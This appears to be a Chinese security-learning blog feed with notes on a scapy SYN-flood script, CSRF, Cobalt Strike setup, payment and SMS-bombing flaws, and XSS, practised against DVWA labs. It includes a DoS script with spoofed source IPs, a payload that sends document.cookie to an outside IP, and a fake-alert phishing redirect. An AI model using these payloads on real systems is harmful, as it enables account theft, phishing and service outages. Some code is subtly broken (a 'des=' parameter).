class="headerlink" title="python 中使用scapy"></a>python 中使用scapy</h1><p>以一个拒绝服务式攻击脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># from scapy.all import IP, TCP</span><br><span class="hljs-keyword">import</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">as</span> scapy<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> DotProduct<br><span class="hljs-keyword">import</span> random<br><br>target=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;input target(ip):&quot;</span>)<br>dPort=<span class="hljs-number">80</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">synFlood</span>(<span class="hljs-params">target,dPort</span>):<br>    srcList=[<span class="hljs-string">&#x27;11.1.1.2&#x27;</span>,<span class="hljs-string">&#x27;22.1.1.2&#x27;</span>,<span class="hljs-string">&#x27;33.1.1.2&#x27;</span>,<span class="hljs-string">&#x27;44.1.1.2&#x27;</span>]<br>    <span class="hljs-keyword">for</span> sPort <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1024</span>,<span class="hljs-number">65535</span>):<br>        index=random.randrange(<span class="hljs-number">4</span>)<br>        ipLayer=scapy.IP(src=srcList[index],des=target)<br>        tcpLayer=scapy.TCP(sport=sPort,dport=dPort,flags=<span class="hljs-string">&quot;S&quot;</span>) <span class="hljs-comment"># 这里S是SYN </span><br>        packet=ipLayer/tcpLayer<br>        scapy.send(packet) <span class="hljs-comment"># 这里不需要接受就是为了造成拒绝服务</span><br><br>synFlood(target,dPort)<br></code></pre></td></tr></table></figure><h1 id="实现基于TCP端口扫描的工具"><a href="#实现基于TCP端口扫描的工具" class="headerlink" title="实现基于TCP端口扫描的工具"></a>实现基于TCP端口扫描的工具</h1><p>[^hping]:hping 命令行的TCP&#x2F;IP数据包解释器&#x2F;分析器，具体可以这篇文章 <a href="https://blog.csdn.net/carefree2005/article/details/120870526">https://blog.csdn.net/carefree2005/article/details/120870526</a><br>[^arpspoof]:这个是用于arp欺骗用的，可以参考这篇文章<a href="https://blog.csdn.net/who_im_i/article/details/120234324">https://blog.csdn.net/who_im_i/article/details/120234324</a><br>[^arping]: mac和ip 的互查，<a href="https://blog.csdn.net/wz_cow/article/details/80870876">https://blog.csdn.net/wz_cow/article/details/80870876</a><br>[^p0f]: 简单理解为被动指纹识别的工具<a href="https://blog.csdn.net/qq_38776582/article/details/124001543">https://blog.csdn.net/qq_38776582/article/details/124001543</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF</title>
    <link href="/2023/12/09/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/CSRF/"/>
    <url>/2023/12/09/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/CSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>协议、域名、端口这些是相同的</p><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p> 这个就可以为攻击者使用受害者的已经认证了的页面去访问，也就是这样就可以做到登录受害者的账号</p><p>这个根源是使用相同的cookie也就是，用户的cookie，这个cookie用于保存用户信息的。在XSS那里提到过，有时候我们不能直接获得cookie的具体的值，那我们就得到他的值，我们直接只用这个访问</p><p>跨站：从一个网站到另一个网站</p><p>请求：HTTP请求</p><p>伪造：伪造，伪装</p><p>总结一下的说：攻击者盗用了你的身份，以你的名义发送恶意请求。</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>CSRF漏洞一般是由于没有检查Referer以及未在头部设置token造成的。</p><p>通过这个我们也可以联想到漏洞的检查方式。当我们把referer修改了之后发现还能正常的访问就说明存在这些问题</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全等等等等。可以说CSRF能够做什么，取决于你在网站里能做什么操作</p><h1 id="与XSS的区别"><a href="#与XSS的区别" class="headerlink" title="与XSS的区别"></a>与XSS的区别</h1><p>前面也提到了，我们可以使用这个cookile而不是直接获取这个值</p><p>下面是更加完整的说法</p><blockquote><p>CSRF与XSS不同，主要在于XSS是获取用户的凭证信息等，而CSRF是利用用户凭证信息，并不获取</p></blockquote><h1 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h1><h2 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h2><p>接下来示范一下</p><p><strong>攻击者：</strong></p><p>正常的修改密码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/CSRF/image-20231210144012391.png" alt="image-20231210144012391"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/CSRF/image-20231210144102490.png" alt="image-20231210144102490"></p><p>密码已经修改了，我们使用攻击者使用url看看</p><blockquote><p><a href="http://192.168.15.166/dvwa/vulnerabilities/csrf/?password_new=0804chgCHG&password_conf=0804chgCHG&Change=Change">http://192.168.15.166/dvwa/vulnerabilities/csrf/?password_new=0804chgCHG&amp;password_conf=0804chgCHG&amp;Change=Change#</a></p></blockquote><p>然后诱导受害者点击这个url那他的密码也会被修改</p><p>如果这个联合存储型XSS的话，只要用户触发了这个XSS那么他的密码就会被无意的被修改了</p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p>这个的危险程度没有GET那么大，同常的形式是一个表单，访问该页面表单位自动提交</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">http://test.com/csrf.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">POST</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xx&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;11&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">submit</span>()</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>相当于模拟了用户提交表单的这个过程</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>主要是和XSS打组合拳，当网站设置了http-only的话，那我们就不能只用XSS获取cookie了，那么我们可以换一个思路不获取它，而是直接利用这个值</p><p>例如，在存在xss漏洞的A网站上注入一条链接点击这里领取黑客秘籍&lt;a href&#x3D;”xxx.xxxx.xxx&#x2F;test.php?money&#x3D;1111”&#x2F;&gt;,当用户点击之后，进入攻击者提前写好的网站B，触发网站B中,例如&lt;img src&#x3D;”http:&#x2F;&#x2F;网站A&#x2F;test.php?Id&#x3D;1&amp;money&#x3D;100000”&#x2F;&gt;这样的恶意代码。这时候由于用户带有A网站的认证信息，B网站利用用户此时的请求，篡改GET或POST表单内的参数，在用户不知情的情况下请求A网站，完成转账，修改密码等恶意操作</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ol><li>Referer检查。攻击者虽然是利用用户的请求进行访问，但是Referer的内容显示的是B网站，也就是攻击者自己构造的网站。如果对Referer进行白名单检查，看是否来自合法的网站。如果不是，就极有可能是CSRF攻击</li><li>添加Token验证。CSRF攻击成功的原因就是利用用户已经认证过的cookie信息。cookie中的身份信息在请求时会自动添加，所以我们要在cookie外再加入一种验证身份的信息。具体的做法是在HTTP请求中，以参数的形式加入一个随机产生的Token,并在服务器端建立一个拦截器来验证这个 Token，如果请求中没有 Token 或者 Token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>基础漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS渗透框架的坑</title>
    <link href="/2023/12/09/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/CS%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9D%91/"/>
    <url>/2023/12/09/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/CS%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>关于我为什么想写这个，因为这个坑，比较让人蛋疼</p><h1 id="关于无法连接问题"><a href="#关于无法连接问题" class="headerlink" title="关于无法连接问题"></a>关于无法连接问题</h1><p><strong>0x00 先看teamserver这个边</strong></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/8bd2451c6679667fca0f5eed602a75e.png" alt="8bd2451c6679667fca0f5eed602a75e"></p><p>这个出现的报错，其实关系不是很大，一般情况下是可以直接连接的</p><p>但是这次我这边却来年接不上。</p><p>我以为时这个的问题</p><p><strong>0x01 权限太低可能啥也没有</strong></p><p>看到这个，我立马查看了端口</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/a08dc08d7812d2bcffc0cf4f8d56c26.png" alt="a08dc08d7812d2bcffc0cf4f8d56c26"></p><p>没有被占用，那到底是为什么。</p><p><strong>0x02 长知识了</strong></p><p>询问了老师才知道，kali没有使用root权限所以root的服务时看不到的，比如下面这个服务</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20231209164751729.png" alt="image-20231209164751729"></p><p>尝试关掉了，但是我这边还是不能正常的连接，那这到底是什么情况呢？</p><p><strong>0x03 吐血了</strong></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20231209164932342.png" alt="image-20231209164932342"></p><p>请注意，这个主机后面添加了一个空格也是不能来连接上的，可能我的习惯的原因无意中添加了空格….</p><p>以至于一直连接不上</p>]]></content>
    
    
    
    <tags>
      
      <tag>技术随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>支付逻辑和权限绕过</title>
    <link href="/2023/12/05/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E5%92%8C%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
    <url>/2023/12/05/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E5%92%8C%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h1><h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>简单理解为用户通过抓包修改价格，数量的方法，吐出钱</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>能让运营商减少营收</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li>敏感数据使用密文传输</li><li>服务端校验过滤用户提交的参数</li><li>提交订单时后台判断是否与数据库中相符合</li><li>服务端计算金额判断是否为正数</li><li>生成数据签名，对用户金额和订单签名</li></ol><h1 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h1><h2 id="漏洞简绍"><a href="#漏洞简绍" class="headerlink" title="漏洞简绍"></a>漏洞简绍</h2><blockquote><p>水平越权：相同级别（权限）的用户或者同一角色中不同的用户之<br>间，可以越权访问、修改或者删除其他用户信息的非法操作。如果<br>出现此漏洞，可能会造成大批量数据的泄露，严重的甚至会造成用<br>户信息被恶意篡改</p><p>垂直越权：就是不同级别之间的用户或不同角色之间用户的越权，<br>比如普通用户可以执行管理员才能执行的功能</p></blockquote><h2 id="漏洞危害-1"><a href="#漏洞危害-1" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><blockquote><p>越权漏洞产生的主要原因是没有对用户的身份做判断和控制，防护<br>这种漏洞时，可以通过session来控制。例如在用户登陆成功后，将<br>username或uid写入到session中，当用户查看个人信息时，从<br>session中取出username，而不是从GET或POST取username，那<br>么此时取到的username就是没有被篡改的。</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>基础漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>短信轰炸漏洞</title>
    <link href="/2023/12/05/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/12/05/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><ol><li>对企业有影响，虽然一条短信比较便宜但是，如果一次性，一直发很多条，那么也会造成很大的危害</li><li>对接收方有影响，造成了信息骚扰。或者利用这个钓鱼</li></ol><h1 id="漏洞出现的位置"><a href="#漏洞出现的位置" class="headerlink" title="漏洞出现的位置"></a>漏洞出现的位置</h1><blockquote><p>注册验证码获取（邮件短信）、注册激活邮件获取（邮件）、密码找回验证（邮件短信）、支付类信息、验证码验证（短信）、站内信、私信发送处（私信，站内信）等任何需要发送给邮件的，短信的地方</p></blockquote><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>qq邮件发送处，可以利用抓包，一直发送</p><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><ol><li><p>使用空格</p><p>注意在邮箱的<strong>最后面</strong>或者<strong>最前面</strong>添加空格</p><blockquote><p>因为业务的逻辑是，使用手机号发送信息，如果一段时间之类发送了就不发送，没有发送就发送。对方的服务器对比的是两个我们使用的电话号码，当使用添加了空格的电话号码之后，这个两个字符串就不相等了</p></blockquote></li><li><p>修改cookie值绕过</p></li><li><p>使用不同的ip绕过</p></li><li><p>利用大小写绕过</p></li><li><p>使用不同账户绕过</p></li></ol><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ol><li><p>合理配置后台短信服务器的功能</p><p>发送次数不超过3~5次，并且可以对发送时间做限制</p></li><li><p>在页面中添加验证码</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>基础漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS</title>
    <link href="/2023/12/01/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XSS/"/>
    <url>/2023/12/01/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XSS/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞简绍"><a href="#漏洞简绍" class="headerlink" title="漏洞简绍"></a>漏洞简绍</h1><p>跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！</p><h1 id="前端基础"><a href="#前端基础" class="headerlink" title="前端基础"></a>前端基础</h1><h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><p>可以在网页上实现任何功能，让其显示图片，试试更新的内容，交互式的地图，2D&#x2F;3D动画，滚动播放的视频等等</p><h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><p>浏览器的对象模型，JS可以通过BOM访问浏览器的相关信息。对浏览器进行交互。可以修改浏览器的大小啊，高度啥的。</p><p>我的理解是可以把BOM抽象成为一个浏览器的接口看，用于操作浏览器的</p><p>对于攻击者来说可以用于发现漏洞的存在，比如XSS</p><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>可以理解为QT的信号和槽函数。我们给某个东西发送一个信号，比如说我们可以给一个按钮点击的事件</p><h3 id="事件处理程序"><a href="#事件处理程序" class="headerlink" title="事件处理程序"></a>事件处理程序</h3><p>这个可以理解为QT的槽函数，用于接受信号，然后作出反应</p><p>针对于某一个事件的就叫做事件处理程序。事件处理程序的开头总是以on开头。比如onclick，onload。如果是模糊事件可以使用onblur</p><p>常见的事件处理程序：</p><h3 id="JS引用方式"><a href="#JS引用方式" class="headerlink" title="JS引用方式"></a>JS引用方式</h3><h4 id="使用Html标签"><a href="#使用Html标签" class="headerlink" title="使用Html标签"></a>使用Html标签</h4><ol><li>使用script</li><li>直接在元素事件中引用</li><li>外部引用JS</li></ol><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>主要是对用户造成危害，但是不会基本不会对服务器造成危害</p><ol><li>钓鱼欺骗</li><li>网站挂马</li><li>身份盗用</li><li>盗取用户的信息</li><li>垃圾信息发送</li><li>劫持用户的web行为</li><li>XSS蠕虫</li></ol><h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><h2 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h2><p>又称为非持久性XSS，这种攻击往往具有一次性</p><p>如果使用，这个需要调用使用社工，钓鱼</p><p>可以使用弹窗发现</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/XSS/image-20231201202831226.png" alt="image-20231201202831226"></p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>又称为持久性XSS，攻击脚本基本储存在咪表的服务器当中，更具有隐蔽性。</p><p>这种多用于博客，论坛，留言板当中，在发帖的过程中嵌入XSS攻击代码，帖子被目标服务器存储在数据库当中，当用户进行正常的额访问时，触发XSS代码</p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>可以理解为不经过后端只在前端执行的代码</p><h1 id="盗用cookie"><a href="#盗用cookie" class="headerlink" title="盗用cookie"></a>盗用cookie</h1><h2 id="cookile简绍"><a href="#cookile简绍" class="headerlink" title="cookile简绍"></a>cookile简绍</h2><p>Cookie是HTTP协议下，服务器可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户的客户端上的小文本文件，它可以包含多种信息</p><h2 id="提前"><a href="#提前" class="headerlink" title="提前"></a>提前</h2><ol><li><p>没有httponly</p></li><li><p>受害者可以直接访问到接收端</p></li><li><p>获取cookie之后目标用户没有退出</p><p>这里如果用户有退出登录了，会话就消失了，也就是说cookie在这里就直接失效了</p></li></ol><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>我们分两个视角来发现，这个过程基于dvwa靶场</p><p><strong>攻击者：</strong></p><p>首先我访问正常的网页内容，然后发现了存在XSS漏洞，我作为攻击者我的目的是获取登录者的cookie然后登录他</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234608819.png" alt="image-20231207234608819"></p><p>我先尝试使用弹窗看是否存在xss</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234837426.png" alt="image-20231207234837426"></p><p>发现不能输入了，这个时候我们修改这个框框的长度</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234935086.png" alt="image-20231207234935086"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207235002011.png" alt="image-20231207235002011"></p><p>下面是我使用另一个浏览器浏览的结果(这里模仿的是其他用户访问带有脚本的网页)</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208103051827.png" alt="image-20231208103051827"></p><p>存在漏洞，那就直接搞</p><p>有多种方式搭建xss平台</p><p><strong>方式一：</strong></p><p>尝试使用云服务器开启python的http服务</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207235504418.png" alt="image-20231207235504418"></p><p>然后构建下面的payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://8.130.123.25:11234/?q=&#x27;</span>.<span class="hljs-title function_">btoa</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>))</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208000108029.png" alt="image-20231208000108029"></p><p>现在看我们的服务器是否发cookie</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208111155822.png" alt="image-20231208111155822"></p><p>本机上面测试的，下面是使用服务器，获取使用者的cookie</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208111904181.png" alt="image-20231208111904181"></p><p>也是成功获取，这个主要的方式是，启动一个我们伪造的网页或者web服务，使用他的cookie作为参数，传给我们，然后我们使用它的cookie就可以登录他的账号了</p><p>我们也可以搭建自己xss平台</p><p>但是上面的方法始终不会很隐蔽</p><h1 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h1><p>就是诱骗你去点链接</p><h2 id="Flash-钓鱼"><a href="#Flash-钓鱼" class="headerlink" title="Flash 钓鱼"></a>Flash 钓鱼</h2><p>就是除了网站url，但是其他的都相同</p><h2 id="cobalt-strike钓鱼"><a href="#cobalt-strike钓鱼" class="headerlink" title="cobalt strike钓鱼"></a>cobalt strike钓鱼</h2><h3 id="CS简介"><a href="#CS简介" class="headerlink" title="CS简介"></a>CS简介</h3><p>这个是常用的团队渗透作战工具，可以实现横向移动，数据窃取，鱼叉式钓鱼的后渗透工具，分为客户端和服务端，一个客户端可以连接多个服务端</p><h3 id="克隆网站"><a href="#克隆网站" class="headerlink" title="克隆网站"></a>克隆网站</h3><p>可以跟着下面的步骤 进行就可以了，我将虚拟机作为服务器win10</p><p>启动cs的克隆网站模式，这里我们克隆dvwa的登录界面，诱使用户点击</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231209160210299.png" alt="image-20231209160210299"></p><p>注意这里不能使用云服务器克隆，因为虚拟机时内网机器，不能被访问到</p><p>我们使用kali克隆</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20231209165153379.png" alt="image-20231209165153379"></p><p>可以成功</p><p>然后我们的思路时，当一个用户方访问正常的页面的时候，跳转到了我们的网站，然后他登录这个网站，我们就可以使用CS的输出信息看他的密码了</p><p>下面时使用的payload，将下面的js放入一个sj文件之后，使用连接访问</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">name</span>)&#123; <span class="hljs-keyword">var</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;IFRAME&quot;</span>); iframe.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&quot;none&quot;</span>; iframe.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&#x27;date:text/plain&#x27;</span>); <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-title function_">appendChild</span>(iframe); <span class="hljs-variable language_">window</span>.<span class="hljs-property">frames</span> [<span class="hljs-number">0</span>].<span class="hljs-property">window</span>.<span class="hljs-title function_">alert</span>(name); iframe.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">removeChild</span>(iframe); &#125; <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;登陆过期，请重新登陆！&quot;</span>); <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://192.168.220.129/&quot;</span><br><br></code></pre></td></tr></table></figure><p>再有xss的地方插入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script src=<span class="hljs-string">&quot;js文件的地址&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="Beef钓鱼"><a href="#Beef钓鱼" class="headerlink" title="Beef钓鱼"></a>Beef钓鱼</h2><h1 id="流量挟持"><a href="#流量挟持" class="headerlink" title="流量挟持"></a>流量挟持</h1><p>可以理解为，增加自己服务器的浏览量，出入到别人的网站里面</p><h1 id="反射型XSS攻击流程"><a href="#反射型XSS攻击流程" class="headerlink" title="反射型XSS攻击流程"></a>反射型XSS攻击流程</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204136766.png" alt="image-20231203204136766"></p><p><strong>反射型XSS：</strong>非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），<strong>一般容易出现在搜索页面</strong>。反射型XSS大多数是用来盗取用户的Cookie信息</p><p>总结一下：</p><ol><li>发送url，给用户</li><li>点击此链接</li><li>服务器获取请求参数并且直接使用，服务器返回结果页面</li></ol><h1 id="存储型XSS攻击流程"><a href="#存储型XSS攻击流程" class="headerlink" title="存储型XSS攻击流程"></a>存储型XSS攻击流程</h1><p>按照字面意思把XSS放在服务器上</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204249856.png" 